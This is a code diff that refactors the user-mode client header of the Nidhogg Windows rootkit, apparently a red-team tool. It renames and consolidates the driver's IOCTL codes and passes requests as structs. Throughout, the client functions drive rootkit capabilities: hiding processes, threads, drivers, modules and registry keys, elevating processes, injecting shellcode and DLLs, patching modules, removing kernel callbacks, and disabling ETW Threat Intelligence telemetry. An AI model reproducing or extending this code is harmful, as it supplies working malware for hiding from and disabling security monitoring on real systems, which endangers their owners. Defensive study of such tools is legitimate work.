@@ -6,44 +6,39 @@
 #pragma comment(lib, "advapi32.lib")
 
 // ** IOCTLS **********************************************************************************************
-#define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNHIDE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_SET_PROCESS_SIGNATURE_LEVEL CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_PROTECT_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_HIDE_UNHIDE_PROCESS CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_ELEVATE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_SET_PROCESS_SIGNATURE_LEVEL CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_QUERY_PROTECTED_PROCESSES CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-#define IOCTL_NIDHOGG_PROTECT_THREAD CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_THREAD CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_THREAD_PROTECTION CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_HIDE_THREAD CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_QUERY_PROTECTED_THREADS CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_PROTECT_UNPROTECT_THREAD CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_CLEAR_THREAD_PROTECTION CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_HIDE_THREAD CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_QUERY_PROTECTED_THREADS CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_QUERY_FILES CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_PROTECT_UNPROTECT_FILE CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_QUERY_FILES CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x814, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_PROTECT_REGITEM CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_QUERY_REGITEMS CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-#define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x815, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_INJECT_SHELLCODE CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_INJECT_DLL CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_HIDE_MODULE CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_PATCH_MODULE CTL_CODE(0x8000, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_INJECT_SHELLCODE CTL_CODE(0x8000, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_INJECT_DLL CTL_CODE(0x8000, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_HIDE_MODULE CTL_CODE(0x8000, 0x814, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-#define IOCTL_NIDHOGG_LIST_OBCALLBACKS CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_LIST_PSROUTINES CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_LIST_OBCALLBACKS CTL_CODE(0x8000, 0x815, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_LIST_PSROUTINES CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_REMOVE_RESTORE_CALLBACK CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-#define IOCTL_NIDHOGG_HIDE_UNHIDE_DRIVER CTL_CODE(0x8000, 0x81F, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_HIDE_UNHIDE_DRIVER CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 // ** General Definitions ***************************************************************************************
@@ -56,6 +51,7 @@
 #define NIDHOGG_ERROR_DEVICECONTROL_DRIVER 3
 #define NIDHOGG_INVALID_COMMAND 4
 #define NIDHOGG_INVALID_OPTION 5
+#define NIDHOGG_INVALID_INPUT 6
 
 #define MAX_PATCHED_MODULES 256
 #define MAX_FILES 256
@@ -136,6 +132,7 @@ enum CallbackType {
 struct KernelCallback {
 	CallbackType Type;
 	ULONG64 CallbackAddress;
+	bool Remove;
 };
 
 struct ObCallback {
@@ -240,6 +237,26 @@ struct HiddenModuleInformation {
 struct HiddenDriverInformation {
 	WCHAR* DriverName;
 	bool Hide;
+};
+
+struct ProtectedProcess {
+	ULONG Pid;
+	bool Protect;
+};
+
+struct HiddenProcess {
+	ULONG Pid;
+	bool Hide;
+};
+
+struct ProtectedThread {
+	ULONG Tid;
+	bool Protect;
+};
+
+struct ProtectedFile {
+	WCHAR* FilePath;
+	bool Protect;
 };
 // *********************************************************************************************************
 
@@ -352,9 +369,10 @@ namespace Nidhogg {
 	namespace ProcessUtils {
 		int NidhoggProcessProtect(HANDLE hNidhogg, DWORD pid) {
 			DWORD returned;
+			ProtectedProcess protectedProcess = {pid, true};
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_PROCESS,
-				&pid, sizeof(pid),
+			if (!DeviceIoControl(hNidhogg, IOCTL_PROTECT_UNPROTECT_PROCESS,
+				&protectedProcess, sizeof(protectedProcess),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 
@@ -363,9 +381,10 @@ namespace Nidhogg {
 
 		int NidhoggProcessUnprotect(HANDLE hNidhogg, DWORD pid) {
 			DWORD returned;
+			ProtectedProcess protectedProcess = { pid, false };
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_PROCESS,
-				&pid, sizeof(pid),
+			if (!DeviceIoControl(hNidhogg, IOCTL_PROTECT_UNPROTECT_PROCESS,
+				&protectedProcess, sizeof(protectedProcess),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 
@@ -375,7 +394,7 @@ namespace Nidhogg {
 		int NidhoggProcessClearAllProtection(HANDLE hNidhogg) {
 			DWORD returned;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION,
+			if (!DeviceIoControl(hNidhogg, IOCTL_CLEAR_PROCESS_PROTECTION,
 				nullptr, 0, nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 
@@ -384,9 +403,10 @@ namespace Nidhogg {
 
 		int NidhoggThreadProtect(HANDLE hNidhogg, DWORD tid) {
 			DWORD returned;
+			ProtectedThread protectedThread = { tid, true };
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_THREAD,
-				&tid, sizeof(tid),
+			if (!DeviceIoControl(hNidhogg, IOCTL_PROTECT_UNPROTECT_THREAD,
+				&protectedThread, sizeof(protectedThread),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 
@@ -395,9 +415,10 @@ namespace Nidhogg {
 
 		int NidhoggThreadUnprotect(HANDLE hNidhogg, DWORD tid) {
 			DWORD returned;
+			ProtectedThread protectedThread = { tid, false };
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_THREAD,
-				&tid, sizeof(tid),
+			if (!DeviceIoControl(hNidhogg, IOCTL_PROTECT_UNPROTECT_THREAD,
+				&protectedThread, sizeof(protectedThread),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 
@@ -407,7 +428,7 @@ namespace Nidhogg {
 		int NidhoggThreadClearAllProtection(HANDLE hNidhogg) {
 			DWORD returned;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_CLEAR_THREAD_PROTECTION,
+			if (!DeviceIoControl(hNidhogg, IOCTL_CLEAR_THREAD_PROTECTION,
 				nullptr, 0, nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 
@@ -416,9 +437,10 @@ namespace Nidhogg {
 
 		int NidhoggProcessHide(HANDLE hNidhogg, DWORD pid) {
 			DWORD returned;
+			HiddenProcess hiddenProcess = { pid, true };
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_HIDE_PROCESS,
-				&pid, sizeof(pid),
+			if (!DeviceIoControl(hNidhogg, IOCTL_HIDE_UNHIDE_PROCESS,
+				&hiddenProcess, sizeof(hiddenProcess),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 
@@ -427,9 +449,10 @@ namespace Nidhogg {
 
 		int NidhoggProcessUnhide(HANDLE hNidhogg, DWORD pid) {
 			DWORD returned;
+			HiddenProcess hiddenProcess = { pid, false };
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNHIDE_PROCESS,
-				&pid, sizeof(pid),
+			if (!DeviceIoControl(hNidhogg, IOCTL_HIDE_UNHIDE_PROCESS,
+				&hiddenProcess, sizeof(hiddenProcess),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 
@@ -439,7 +462,7 @@ namespace Nidhogg {
 		int NidhoggThreadHide(HANDLE hNidhogg, DWORD tid) {
 			DWORD returned;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_HIDE_THREAD,
+			if (!DeviceIoControl(hNidhogg, IOCTL_HIDE_THREAD,
 				&tid, sizeof(tid),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -450,7 +473,7 @@ namespace Nidhogg {
 		int NidhoggProcessElevate(HANDLE hNidhogg, DWORD pid) {
 			DWORD returned;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_ELEVATE_PROCESS,
+			if (!DeviceIoControl(hNidhogg, IOCTL_ELEVATE_PROCESS,
 				&pid, sizeof(pid),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -466,7 +489,7 @@ namespace Nidhogg {
 			processSignature.SignerType = signerType;
 			processSignature.SignatureSigner = signatureSigner;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_SET_PROCESS_SIGNATURE_LEVEL,
+			if (!DeviceIoControl(hNidhogg, IOCTL_SET_PROCESS_SIGNATURE_LEVEL,
 				&processSignature, sizeof(processSignature),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -479,7 +502,7 @@ namespace Nidhogg {
 			ProcessesList result{};
 			std::vector<DWORD> pids;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES,
+			if (!DeviceIoControl(hNidhogg, IOCTL_QUERY_PROTECTED_PROCESSES,
 				nullptr, 0,
 				&result, sizeof(result), &returned, nullptr)) {
 
@@ -499,7 +522,7 @@ namespace Nidhogg {
 			ThreadsList result{};
 			std::vector<DWORD> tids;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_PROTECTED_THREADS,
+			if (!DeviceIoControl(hNidhogg, IOCTL_QUERY_PROTECTED_THREADS,
 				nullptr, 0,
 				&result, sizeof(result), &returned, nullptr)) {
 
@@ -518,9 +541,13 @@ namespace Nidhogg {
 	namespace FileUtils {
 		int NidhoggFileProtect(HANDLE hNidhogg, wchar_t* filePath) {
 			DWORD returned;
+			ProtectedFile protectedFile = { filePath, true };
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_FILE,
-				(PVOID)filePath, ((DWORD)(wcslen(filePath) + 1)) * sizeof(WCHAR),
+			if (wcslen(filePath) > MAX_PATH)
+				return NIDHOGG_INVALID_INPUT;
+
+			if (!DeviceIoControl(hNidhogg, IOCTL_PROTECT_UNPROTECT_FILE,
+				&protectedFile, sizeof(protectedFile),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 
@@ -529,9 +556,10 @@ namespace Nidhogg {
 
 		int NidhoggFileUnprotect(HANDLE hNidhogg, wchar_t* filePath) {
 			DWORD returned;
+			ProtectedFile protectedFile = { filePath, false };
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_FILE,
-				(PVOID)filePath, ((DWORD)(wcslen(filePath) + 1)) * sizeof(WCHAR),
+			if (!DeviceIoControl(hNidhogg, IOCTL_PROTECT_UNPROTECT_FILE,
+				&protectedFile, sizeof(protectedFile),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 
@@ -541,7 +569,7 @@ namespace Nidhogg {
 		int NidhoggFileClearAllProtection(HANDLE hNidhogg) {
 			DWORD returned;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION,
+			if (!DeviceIoControl(hNidhogg, IOCTL_CLEAR_FILE_PROTECTION,
 				nullptr, 0, nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 
@@ -555,7 +583,7 @@ namespace Nidhogg {
 			int amountOfFiles = 0;
 			result.FileIndex = 0;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_FILES,
+			if (!DeviceIoControl(hNidhogg, IOCTL_QUERY_FILES,
 				nullptr, 0,
 				&result, sizeof(result), &returned, nullptr)) {
 
@@ -574,7 +602,7 @@ namespace Nidhogg {
 			for (int i = 1; i < amountOfFiles; i++) {
 				result.FileIndex = i;
 
-				if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_FILES,
+				if (!DeviceIoControl(hNidhogg, IOCTL_QUERY_FILES,
 					nullptr, 0,
 					&result, sizeof(result), &returned, nullptr)) {
 
@@ -604,7 +632,7 @@ namespace Nidhogg {
 			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
 			item.Type = RegItemType::RegProtectedKey;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_REGITEM,
+			if (!DeviceIoControl(hNidhogg, IOCTL_PROTECT_REGITEM,
 				&item, sizeof(item),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -624,7 +652,7 @@ namespace Nidhogg {
 			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
 			item.Type = RegItemType::RegHiddenKey;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_REGITEM,
+			if (!DeviceIoControl(hNidhogg, IOCTL_PROTECT_REGITEM,
 				&item, sizeof(item),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -645,7 +673,7 @@ namespace Nidhogg {
 			wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
 			item.Type = RegItemType::RegProtectedValue;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_REGITEM,
+			if (!DeviceIoControl(hNidhogg, IOCTL_PROTECT_REGITEM,
 				&item, sizeof(item),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -666,7 +694,7 @@ namespace Nidhogg {
 			wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
 			item.Type = RegItemType::RegHiddenValue;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_REGITEM,
+			if (!DeviceIoControl(hNidhogg, IOCTL_PROTECT_REGITEM,
 				&item, sizeof(item),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -686,7 +714,7 @@ namespace Nidhogg {
 			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
 			item.Type = RegItemType::RegProtectedKey;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
+			if (!DeviceIoControl(hNidhogg, IOCTL_UNPROTECT_REGITEM,
 				&item, sizeof(item),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -706,7 +734,7 @@ namespace Nidhogg {
 			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
 			item.Type = RegItemType::RegHiddenKey;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
+			if (!DeviceIoControl(hNidhogg, IOCTL_UNPROTECT_REGITEM,
 				&item, sizeof(item),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -727,7 +755,7 @@ namespace Nidhogg {
 			wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
 			item.Type = RegItemType::RegProtectedValue;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
+			if (!DeviceIoControl(hNidhogg, IOCTL_UNPROTECT_REGITEM,
 				&item, sizeof(item),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -748,7 +776,7 @@ namespace Nidhogg {
 			wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
 			item.Type = RegItemType::RegHiddenValue;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
+			if (!DeviceIoControl(hNidhogg, IOCTL_UNPROTECT_REGITEM,
 				&item, sizeof(item),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -759,7 +787,7 @@ namespace Nidhogg {
 		int NidhoggRegistryClearAll(HANDLE hNidhogg) {
 			DWORD returned;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_CLEAR_REGITEMS,
+			if (!DeviceIoControl(hNidhogg, IOCTL_CLEAR_REGITEMS,
 				nullptr, 0, nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 
@@ -775,7 +803,7 @@ namespace Nidhogg {
 			result.RegItemsIndex = 0;
 			result.Type = RegItemType::RegProtectedKey;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
+			if (!DeviceIoControl(hNidhogg, IOCTL_QUERY_REGITEMS,
 				&result, sizeof(result),
 				&result, sizeof(result), &returned, nullptr)) {
 
@@ -794,7 +822,7 @@ namespace Nidhogg {
 			for (int i = 1; i < amountOfKeys; i++) {
 				result.RegItemsIndex = i;
 
-				if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
+				if (!DeviceIoControl(hNidhogg, IOCTL_QUERY_REGITEMS,
 					nullptr, 0,
 					&result, sizeof(result), &returned, nullptr)) {
 
@@ -818,7 +846,7 @@ namespace Nidhogg {
 			result.RegItemsIndex = 0;
 			result.Type = RegItemType::RegHiddenKey;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
+			if (!DeviceIoControl(hNidhogg, IOCTL_QUERY_REGITEMS,
 				&result, sizeof(result),
 				&result, sizeof(result), &returned, nullptr)) {
 
@@ -837,7 +865,7 @@ namespace Nidhogg {
 			for (int i = 1; i < amountOfKeys; i++) {
 				result.RegItemsIndex = i;
 
-				if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
+				if (!DeviceIoControl(hNidhogg, IOCTL_QUERY_REGITEMS,
 					nullptr, 0,
 					&result, sizeof(result), &returned, nullptr)) {
 
@@ -862,7 +890,7 @@ namespace Nidhogg {
 			result.RegItemsIndex = 0;
 			result.Type = RegItemType::RegProtectedValue;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
+			if (!DeviceIoControl(hNidhogg, IOCTL_QUERY_REGITEMS,
 				&result, sizeof(result),
 				&result, sizeof(result), &returned, nullptr)) {
 
@@ -884,7 +912,7 @@ namespace Nidhogg {
 			for (int i = 1; i < amountOfValues; i++) {
 				result.RegItemsIndex = i;
 
-				if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
+				if (!DeviceIoControl(hNidhogg, IOCTL_QUERY_REGITEMS,
 					nullptr, 0,
 					&result, sizeof(result), &returned, nullptr)) {
 
@@ -913,7 +941,7 @@ namespace Nidhogg {
 			result.RegItemsIndex = 0;
 			result.Type = RegItemType::RegHiddenValue;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
+			if (!DeviceIoControl(hNidhogg, IOCTL_QUERY_REGITEMS,
 				&result, sizeof(result),
 				&result, sizeof(result), &returned, nullptr)) {
 
@@ -935,7 +963,7 @@ namespace Nidhogg {
 			for (int i = 1; i < amountOfValues; i++) {
 				result.RegItemsIndex = i;
 
-				if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
+				if (!DeviceIoControl(hNidhogg, IOCTL_QUERY_REGITEMS,
 					nullptr, 0,
 					&result, sizeof(result), &returned, nullptr)) {
 
@@ -970,7 +998,7 @@ namespace Nidhogg {
 			driverInfo.DriverName = parsedDriverName.data();
 			driverInfo.Hide = true;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_HIDE_UNHIDE_DRIVER,
+			if (!DeviceIoControl(hNidhogg, IOCTL_HIDE_UNHIDE_DRIVER,
 				&driverInfo, sizeof(driverInfo),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -991,7 +1019,7 @@ namespace Nidhogg {
 			moduleInfo.Pid = pid;
 			moduleInfo.ModuleName = modulePath;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_HIDE_MODULE,
+			if (!DeviceIoControl(hNidhogg, IOCTL_HIDE_MODULE,
 				&moduleInfo, sizeof(moduleInfo),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -1013,7 +1041,7 @@ namespace Nidhogg {
 			dllInformation.Pid = pid;
 			strcpy_s(dllInformation.DllPath, strlen(dllPath) + 1, dllPath);
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_INJECT_DLL,
+			if (!DeviceIoControl(hNidhogg, IOCTL_INJECT_DLL,
 				&dllInformation, sizeof(dllInformation),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -1036,7 +1064,7 @@ namespace Nidhogg {
 			shellcodeInformation.Parameter2 = parameter2;
 			shellcodeInformation.Parameter3 = parameter3;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_INJECT_SHELLCODE,
+			if (!DeviceIoControl(hNidhogg, IOCTL_INJECT_SHELLCODE,
 				&shellcodeInformation, sizeof(shellcodeInformation),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -1060,7 +1088,7 @@ namespace Nidhogg {
 			if (wcslen(moduleName) > MAX_PATH)
 				return NIDHOGG_GENERAL_ERROR;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PATCH_MODULE,
+			if (!DeviceIoControl(hNidhogg, IOCTL_PATCH_MODULE,
 				&patchedModule, sizeof(patchedModule),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -1082,10 +1110,9 @@ namespace Nidhogg {
 	namespace AntiAnalysis {
 		int NidhoggEnableDisableEtwTi(HANDLE hNidhogg, bool enable) {
 			DWORD returned;
-			ULONG enableDisable = enable;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI,
-				&enableDisable, sizeof(enableDisable),
+			if (!DeviceIoControl(hNidhogg, IOCTL_ENABLE_DISABLE_ETWTI,
+				&enable, sizeof(enable),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 
@@ -1098,8 +1125,9 @@ namespace Nidhogg {
 
 			callback.CallbackAddress = callbackAddress;
 			callback.Type = callbackType;
+			callback.Remove = true;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_REMOVE_CALLBACK,
+			if (!DeviceIoControl(hNidhogg, IOCTL_REMOVE_RESTORE_CALLBACK,
 				&callback, sizeof(callback),
 				nullptr, 0, &returned, nullptr))
